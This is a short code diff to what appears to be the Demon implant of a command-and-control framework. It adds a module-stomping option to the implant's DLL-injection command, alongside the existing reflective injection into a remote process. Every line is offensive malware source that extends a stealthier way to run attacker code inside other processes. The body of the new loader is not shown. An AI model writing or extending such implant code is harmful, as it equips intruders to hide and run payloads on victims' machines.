@@ -12,6 +12,7 @@
 #include <core/Kerberos.h>
 #include <core/CoffeeLdr.h>
 #include <inject/Inject.h>
+#include <inject/Stomp.h>
 
 SEC_DATA DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_SLEEP,                    .Function = CommandSleep                    },
@@ -1230,7 +1231,19 @@ VOID CommandInjectDLL( PPARSER Parser )
 
     if ( hProcess )
     {
-        Result = DllInjectReflective( hProcess, DllLdr, DllLdrSize, DllBytes, DllSize, InjCtx.Parameter, InjCtx.ParameterSize, &InjCtx );
+        /* ARC-05: dispatch to the module-stomping loader when requested */
+        if ( InjCtx.Technique == INJECTION_TECHNIQUE_MODULE_STOMP ) {
+            PUTS( "[INJECT] using module-stomp technique (ARC-05)" )
+            Result = DllInjectModuleStomp( hProcess, DllLdr, DllLdrSize,
+                                           DllBytes, DllSize,
+                                           InjCtx.Parameter, InjCtx.ParameterSize,
+                                           &InjCtx );
+        } else {
+            Result = DllInjectReflective( hProcess, DllLdr, DllLdrSize,
+                                          DllBytes, DllSize,
+                                          InjCtx.Parameter, InjCtx.ParameterSize,
+                                          &InjCtx );
+        }
         SysNtClose( hProcess );
     }
     else
